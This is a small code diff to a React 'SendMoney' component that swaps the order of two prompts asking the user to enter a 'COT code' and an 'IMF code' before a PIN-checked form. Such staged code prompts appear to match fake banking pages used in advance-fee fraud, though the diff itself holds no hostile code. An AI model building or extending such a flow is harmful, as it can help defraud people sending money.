@@ -100,11 +100,11 @@ const SendMoney = () => {
           </button>
           {trial == 1 ? (
             <h6 className="tac" style={{ color: "wheat" }}>
-              Enter Your IMF code
+              Enter your COT code
             </h6>
           ) : (
             <h6 className="tac" style={{ color: "wheat" }}>
-              Enter your COT code
+              Enter Your IMF code
             </h6>
           )}
           <form onSubmit={checkPin}>
